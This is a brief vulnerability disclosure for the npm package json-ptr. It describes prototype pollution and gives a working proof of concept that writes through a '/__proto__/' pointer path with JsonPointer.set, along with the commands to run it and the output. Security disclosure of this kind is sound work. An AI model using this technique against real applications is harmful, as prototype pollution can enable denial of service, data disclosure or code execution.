# Description

`json-ptr` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var {JsonPointer } = require("json-ptr")
var obj = {}
console.log("Before : " + obj.polluted);
JsonPointer.set(obj,'/__proto__/polluted','Yes! Its Polluted', true);
var obj1 ={}
console.log("After : " + obj1.polluted);
```

2. Execute the following commands in another terminal:

```bash
npm i json-ptr # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
